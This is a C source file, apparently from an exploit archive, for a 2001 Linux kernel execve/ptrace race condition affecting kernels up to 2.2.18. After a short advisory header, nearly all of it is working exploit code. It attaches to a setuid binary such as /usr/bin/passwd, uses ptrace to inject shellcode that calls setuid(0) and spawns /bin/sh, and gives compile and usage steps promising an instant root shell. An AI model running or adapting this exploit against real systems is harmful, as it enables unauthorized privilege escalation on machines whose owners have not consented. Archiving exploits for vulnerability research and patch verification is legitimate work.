/*
EDB Note: Updated exploit can be found here: https://www.exploit-db.com/exploits/20721/

source: http://www.securityfocus.com/bid/2529/info

The Linux kernel is the core of all distributions of the Linux Operating System. It was originally written by Linus Torvalds, and is maintained by a community of developers.

A problem in the Linux Kernel could make it possible for a local user to gain elevated privileges. A problem with the checking of process tracing on programs attempting to execute other programs that are setuid or setgid. It is possible to trace a process after it has entered a setuid or setgid execution state.

This makes it possible for a local user to change parts of the process as they function, and potentially gain elevated privileges. 
*/

/*
 * epcs v2
 * ~~~~~~~
 * exploit for execve/ptrace race condition in Linux kernel up to 2.2.18
 *
 * (c) 2001 Wojciech Purczynski / cliph / <wp@elzabsoft.pl>
 *
 * This sploit does _not_ use brute force. It does not need that.
 * It does only one attemt to sploit the race condition in execve. 
 * Parent process waits for a context-switch that occur after 
 * child task sleep in execve.
 *
 * It should work even on openwall-patched kernels (I haven't tested it).
 *
 * Compile it:
 *	cc epcs.c -o epcs
 * Usage:
 *	./epcs [victim] [address]
 *
 * It gives instant root shell with any of a suid binaries.
 *
 * If it does not work, try use some methods to ensure that execve
 * would sleep while loading binary file into memory,
 *
 * 	i.e.: cat /usr/lib/* >/dev/null 2>&1
 *
 * Tested on RH 7.0 and RH 6.2 / 2.2.14 / 2.2.18 / 2.2.18ow4
 * This exploit does not work on 2.4.x because kernel won't set suid 
 * privileges if user ptraces a binary.
 * But it is still exploitable on these kernels.
 *
 * Thanks to Bulba (he made me to take a look at this bug ;) )
 * Greetings to SigSegv team.
 *
 */

#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>
#include <linux/user.h>
#include <sys/wait.h>
#include <limits.h>
#include <errno.h>
#include <stdlib.h>

#define CS_SIGNAL SIGUSR1
#define VICTIM "/usr/bin/passwd"
#define SHELL "/bin/sh"
#define SHELL_LEN "\x07"		/* strlen(SHELL) in hex */
#define SHELLCODE 0x00000000		/* address to put shellcode at */

/*
 * This is my private shellcode.
 * Offset 0x0a - executable's filename length.
 */
char shellcode[1024]=
	"\xeb\xfe"
	"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"		/* setuid(0) */
	"\x31\xc0\xb0\x2e\xcd\x80"
	"\x31\xc0\x50\xeb\x17\x8b\x1c\x24"		/* execve(SHELL) */
	"\x88\x43" SHELL_LEN "\x89\xe1\x8d\x54\x24"
	"\x04\xb0\x0b\xcd\x80\x31\xc0\x89"
	"\xc3\x40\xcd\x80\xe8\xe4\xff\xff"
	"\xff" SHELL ;

volatile int cs_detector=0;

void cs_sig_handler(int sig)
{
	cs_detector=1;
}

void do_victim(char * filename)
{
	while (!cs_detector) ;
	kill(getppid(), CS_SIGNAL);
	execl(filename, filename, NULL);
	perror("execl");
	exit(-1);
}

int check_execve(pid_t victim, char * filename)
{
	char path[PATH_MAX+1];
	char link[PATH_MAX+1];
	int res;
	
	snprintf(path, sizeof(path), "/proc/%i/exe", (int)victim);
	if (readlink(path, link, sizeof(link)-1)<0) {
		perror("readlink");
		return -1;
	}
	
	link[sizeof(link)-1]='\0';
	res=!strcmp(link, filename);
	if (res) fprintf(stderr, "Child slept outside of execve\n");
	return res;
}

int main(int argc, char * argv[])
{
	char * filename=VICTIM;
	pid_t victim;
	int error, i;
	unsigned long eip=SHELLCODE;
	struct user_regs_struct regs;

	if (argc>1) filename=argv[1];
	if (argc>2) eip=strtoul(argv[2], NULL, 16);

	signal(CS_SIGNAL, cs_sig_handler);

	victim=fork();
	if (victim<0) {
		perror("fork: victim");
		exit(-1);
	}
	if (victim==0) do_victim(filename);

	kill(victim, CS_SIGNAL);
	while (!cs_detector) ;
	
	if (ptrace(PTRACE_ATTACH, victim)) {
		perror("ptrace: PTRACE_ATTACH");
		goto exit;
	}
	
	if (check_execve(victim, filename))
		goto exit;

	(void)waitpid(victim, NULL, WUNTRACED);
	if (ptrace(PTRACE_CONT, victim, 0, 0)) {
		perror("ptrace: PTRACE_CONT");
		goto exit;
	}

	(void)waitpid(victim, NULL, WUNTRACED);
	
	if (ptrace(PTRACE_GETREGS, victim, 0, &regs)) {
		perror("ptrace: PTRACE_GETREGS");
		goto exit;
	}

	regs.eip=eip;
	
	for (i=0; i<strlen(shellcode); i+=4) {
		if (ptrace(PTRACE_POKEDATA, victim, regs.eip+i,
						    *(int*)(shellcode+i))) {
			perror("ptrace: PTRACE_POKETEXT");
			goto exit;
		}
	}

	if (ptrace(PTRACE_GETREGS, victim, 0, &regs)) {
		perror("ptrace: PTRACE_GETREGS");
		goto exit;
	}

	fprintf(stderr, "Bug exploited successfully.\n");
	
	if (ptrace(PTRACE_DETACH, victim, 0, 0)) {
		perror("ptrace: PTRACE_CONT");
		goto exit;
	}

	(void)waitpid(victim, NULL, 0);
	return 0;
	
exit:
	fprintf(stderr, "Error!\n");
	kill(victim, SIGKILL);
	return -1;
}